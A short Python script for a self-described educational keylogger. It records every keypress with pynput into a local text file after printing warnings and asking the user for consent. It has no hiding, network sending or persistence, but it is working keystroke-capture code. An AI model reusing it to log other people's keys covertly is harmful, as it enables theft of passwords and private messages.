from pynput import keyboard
from colorama import init
from termcolor import colored


def output_warning_and_disclaimer():
    print(colored("This Application Is For Educational Use Only!!!\n", "white", "on_green"))
    print(colored("This Application Might Be Flagged By Your Anti-Virus As Malware!!!", "white", "on_yellow"))
    print(colored("You Might Need to Give It Permission To Run On Your Machine.\n", "white", "on_yellow"))
    print(colored("NB: This Application Will Keep Record Of All The Keys You Type While It's Active.\n", "white", "on_red"))


def ask_permission():
    print(colored("Would You Like To Continue With The Application? (yes(y)/no(n))", "white", "on_yellow"))
    decision = input()
    if decision.lower() in ["yes", "y"]:
        return True
    elif decision.lower() in ["no", "n"]:
        return False
    else:
        return ask_permission()


def listen_and_save_keys(key):
    print(key)
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:  # This handles special keys like 'space', 'enter', etc.
            logKey.write(f" [{key}] ")
        except:
            print(colored("Error While Trying To Read The Key", "red"))


def get_listener():
    return keyboard.Listener(on_press=listen_and_save_keys)


def end_program(listener):
    print("To end the program, press '1'.")
    decision = input()
    if decision != "1":
        return end_program(listener)

    listener.stop()  # Stop the key listener when user enters '1'


if __name__ == "__main__":
    print("*** Welcome To The Key Logger Program. ***")
    output_warning_and_disclaimer()

    decision = ask_permission()
    if decision:
        listener = get_listener()
        listener.start()  # Start the key logger

        end_program(listener)  # Wait for the user to terminate the program

    print("*** Thank You For Using The Key Logger Program ***")



